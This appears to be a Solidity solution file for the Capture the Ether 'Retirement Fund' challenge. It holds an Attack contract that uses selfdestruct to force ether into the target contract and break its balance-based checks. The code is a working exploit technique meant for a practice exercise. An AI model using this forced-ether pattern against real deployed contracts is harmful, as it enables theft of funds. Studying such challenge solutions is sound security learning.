pragma solidity ^0.4.21;

import {RetirementFundChallenge} from "./RetirementFund.sol";


contract Attack {
    RetirementFundChallenge private target;

    constructor(address _target) payable public {
        target = RetirementFundChallenge(_target);
    }

    function hack() public payable {
        require(msg.value > 0);

        //* destroy the contract & give the funds to the target contract
        selfdestruct(target);
    }
}
